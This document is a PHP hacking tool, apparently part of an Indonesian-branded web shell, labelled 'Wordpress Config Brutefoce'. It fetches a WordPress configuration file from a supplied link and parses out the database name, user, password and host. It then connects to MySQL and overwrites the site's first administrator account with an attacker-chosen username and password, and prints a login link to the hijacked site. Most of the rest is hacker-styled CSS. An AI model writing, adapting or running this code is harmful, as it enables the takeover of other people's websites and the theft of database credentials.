<?php
{ error_reporting(0);
if ($_POST['kill']) 
{$url = $_POST['url'];$user = $_POST['user'];$pass =$_POST['pass'];$pss = md5($pass);
function enter($text,$a,$b){$explode = explode($a,$text);$explode = explode($b,$explode[1]);
return $explode[0];}$config = file_get_contents($url);$password =  enter($config,"define('DB_PASSWORD', '","');");
$username =  enter($config,"define('DB_USER', '","');");$db =  enter($config,"define('DB_NAME', '","');");
$prefix =  enter($config,'$table_prefix  = \'',"';");$host =  enter($config,"define('DB_HOST', '","');");


if($config && preg_match('/DB_NAME/i',$config)){$conn= @mysql_connect($host,$username ,$password ) or die ("i can't connect to mysql, check your data");
@mysql_select_db($db,$conn) or die (mysql_error());
$grab = @mysql_query("SELECT * from  `wp_options` WHERE option_name='home'");
$data = @mysql_fetch_array($grab);$site_url = $data["option_value"];
$query = mysql_query("UPDATE `".$prefix."users` SET `user_login` = '".$user."',`user_pass` = '".$pss."' WHERE `ID` = 1");

if ($query) 
{echo '<center><h2 class="HsH">Berhasil</center></h2>
<br><table width="100%"><tr><th width="20%">site</th>
<th width="20%">user</th><th with="20%">password</th>
<th width="20%">link</th></tr><tr><td width="20%">
<font size="2" color="green">'.$site_url.'</font></td><td width="20%">'.$user.'</td>
<td with="20%">'.$pass.'</td><td width="20%">
<a href="'.$site_url.'/wp-login.php">
<font color="#00ff00">login</font></td></tr></table>';} 
else echo '<h2 class="HsH"><font color="#ff0000">ERROR !</font></h2>';} 
else die('<center><h2 class="HsH">Wordpress config Salah Cok</h2></center>');
exit;
} 
else {  

echo "<center><br><br><div class=\"mybox\">
<form method=\"post\">
<h2 style='font-size:26px;' class='HsH'><br>Wordpress Config Brutefoce</h2><br>
<table><tr><td>config link&nbsp;:&nbsp;</td>
<td><input size=\"26\" class=\"inputz\" type=\"text\" name=\"url\" value=\"\"></td></tr>
<tr><td>new user&nbsp;:&nbsp;</td>
<td><input class=\"inputz\" type=\"text\" name=\"user\" size=\"26\" value=\"admin\"></td></tr>
<tr><td>new password&nbsp;:&nbsp;</td>
<td><input class=\"inputz\" type=\"text\" size=\"26\" name=\"pass\" value=\"HsH1337\"></td></tr> 
</table><br>
<input class=\"btn cta\" type=\"submit\" name=\"kill\" value=\" Ganti \"></form><br></div></center>



<style type='text/css'>
	body,table{background:  ; font-family:Verdana,tahoma; color: Darkviolet ; font-size:11px }
A:link {text-decoration: none;color: lime;}
A:active {text-decoration: none;color: lime;}
A:visited {text-decoration: none;color: lime;}
A:hover {text-decoration: underline; color: Fuchsia;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
input:hover,tr:hover,td:hover{background-color:  ; color: lime;}
 
td {background-color: #000500; font-family: Courier New; font-size:11pt; color:#999999; border-color:#FFFFFF; border-width:1pt 0pt; border-style:solid; border-collapse:collapse;padding:0pt 3pt;vertical-align:middle;}
A:Link, A:Visited { color: #999999;	text-decoration: none; }
A.no:Link, A.no:Visited { text-decoration: none; }
A:Hover, A:Visited:Hover , A.no:Hover, A.no:Visited:Hover { color: # ; background-color:lime; text-decoration: none; }
input,select,option { font:8pt tahoma;color:#666666;margin:2;border:1px solid #666666; }
textarea { color:#666666;font:verdana bold;border:1px solid ;margin:2; }
.fleft { float:left;text-align:left; }
.fright { float:right;text-align:right; }
#pagebar { font:8pt tahoma;padding:5px; border:3px solid #333333; border-collapse:collapse; }
#pagebar td { vertical-align:top; }
#pagebar p { font:8pt tahoma;}
#pagebar a { font-weight:bold;color:#666666; }
#pagebar a:visited { color:# ; }
#mainmenu { text-align:center; }
#mainmenu a { text-align: center;padding: 0px 5px 0px 5px; }
#maininfo,.barheader,.barheader2 { text-align:center; }
#maininfo td { padding:3px; }
.barheader { font-weight:bold;padding:5px; }
.barheader2 { padding:5px;border:2px solid #333333; }
.contents,.explorer { border-collapse:collapse;}
.contents td { vertical-align:top; }
.mainpanel { border-collapse:collapse;padding:5px; }
.barheader,.mainpanel table,td { border:1px solid #333333; }
.mainpanel input,select,option { border:1px solid #333333;margin:0; }
input[type='submit'] { border:1px solid #333333; }
input[type='text'] { padding:3px;}
.fxerrmsg { color:red; font-weight:bold; }
#pagebar,#pagebar p,h1,h2,h3,h4,form { margin:0; }
#pagebar,.mainpanel,input[type='submit'] { background-color:black; }
.barheader2,input,select,option,input[type='submit']:hover { background-color:black; }
textarea,.mainpanel input,select,option { background-color:#000000; }
.blink {
    animation-duration: 1s;
    animation-iteration-count: infinite;
    animation-name: blink;
}
 
@keyframes blink {
    0% {
        opacity: 1;
    }
    75% {
        opacity: 1;
    }
    76% {
        opacity: 0;
    }
    100% {
        opacity: 0;
    }
}
 
 title{font-weight:bold;letter-spacing:1px;font-family: 'orbitron';color:  ;font-size:20px;text-shadow: 1px 1px 1px  ;}input[type=text]{-moz-box-shadow:0 0 1px black;-webkit-box-shadow:0 0 1px black;height:18px;margin-left: 5px;}input:focus, textarea:focus ,button:active{box-shadow: 0 0 1px lime;-webkit-box-shadow: 0 0 1px rgba(0, 0, 255, 1);-moz-box-shadow: 0 0 1px rgba(9, 9, 255, 1);background: ;overflow: auto;}#menu{font-family:orbitron;background: ;margin:5px 2px 4px 2px;}div #menu li:hover {cursor:pointer;}div#menu li:hover>ul a:hover{width:118;background:rgba(0,155,150,0.2);}div#menu ul {margin:0;padding:0;float:left;-moz-border-radius: 6px; border-radius: 12px; border:1px solid lime;}div#menu li {position:relative;display:block;float:left;}div#menu li:hover>ul {left:0px;border-left:1px solid #;}div#menu a{display:block;float:left;font-family:orbitron;padding:4px 6px;margin:0;text-decoration:none;letter-spacing:1px;color:#;}div#menu a:hover{background:rgba(0,155,150,0.2);font-family:orbitron;border-bottom:0px;}div#menu ul ul {position:absolute;top:18px;left:-990em;width:130px;padding:1px 0 5px 0;background: ;margin-top:2px;}div#menu ul ul a {padding:2px 2px 2px 10px;height:20px;float:none;display:block;color:#;}.HsH {text-align: center;letter-spacing:1px;font-family: 'orbitron';color: # ;font-size:25px;text-shadow: 1px 1px 5px  ;} .mybox{-moz-border-radius: 10px; border-radius: 10px;border:1px solid lime; padding:4px 2px;width:70%;line-height:24px;background:# ;box-shadow: 0px 1px 1px #;-webkit-box-shadow: 0px 4px 2px  lime;-moz-box-shadow: 0px 1px 2px Darkviolet;}.myboxtbl{ width:50%; }body{background: ;} a {text-decoration:none;} hr, a:hover{border-bottom:1px solid lime;} *{text-shadow: 0pt 0pt 0.3em rgb(153, 153, 153);font-size:11px;font-family:Tahoma,Verdana,Arial;color: ;} .tabnet{margin:15px auto 0 auto;border: 1px solid #333333;} .main {width:100%;} .gaya {color: lime;} .top{border-left:1px solid lime;border-RIGHT:1px solid lime;font-family:verdana;} .inputz, option{outline:none;transition: all 0.20s ease-in-out;-webkit-transition: all 0.20s ease-in-out;-moz-transition: all 0.20s ease-in-out;border:1px solid lime;background:#111111; border:0; padding:2px; border-bottom:1px solid #393939; font-size:11px; color:lime; -moz-border-radius: 6px; border-radius: 12px; border:1px solid lime;margin:4px 0 8px 0;} .inputzbut{background:#111111;color:#8f8f8f;margin:0 4px;border:1px solid lime;}  .inputzbut:hover{background:#222222;border-left:1px solid lime;border-right:1px solid lime;border-bottom:1px solid lime;border-top:1px solid lime;}.inputz:hover{ -moz-border-radius: 6px; border-radius: 10px; border:1px solid lime;margin:4px 0 8px 0;border-bottom:1px solid lime;border-top:1px solid lime;}.output2 {margin:auto;border:1px solid lime;background: ;padding:0 2px;} textarea{margin:auto;border:2px solid lime;background: ;padding:0 2px;} .output {margin:auto;border:1px solid #303030;width:100%;height:400px;background: ;padding:0 2px;} .cmdbox{width:100%;}.head_info{padding: 0 4px;} .b1{font-size:30px;padding:0;color:lime;} .b2{font-size:30px;padding:0;color:lime;} .b_tbl{text-align:center;margin:0 4px 0 0;padding:0 4px 0 0;border-right:1px solid #333333;} .phpinfo table{width:100%;padding:0 0 0 0;} .phpinfo td{background: ;color: ;padding:6px 8px;;} .phpinfo th, th{background:  ;border-bottom:1px solid   ;font-weight:normal;} .phpinfo h2, .phpinfo h2 a{text-align:center;font-size:16px;padding:0;margin:30px 0 0 0;background:  ;padding:4px 0;} .explore{width:100%;} .explore a {text-decoration:none;} .explore td{border-bottom:1px solid lime ;padding:0 8px;line-height:24px;} .explore th{padding:3px 8px;font-weight:normal;color:#;} .explore th:hover , .phpinfo th:hover, th:hover{color: ;background:  ;} .explore tr:hover{background:rgba(35,96,156,0.2);} .viewfile{background: ;color: ;margin:4px 2px;padding:8px;} .sembunyi{display:none;padding:0;margin:0;} k, k a, k a:hover{text-shadow: 0pt 0pt 0.3em lime;font-family:orbitron;font-size:25px;color: ;}</style> 





";
} 
} 
?>
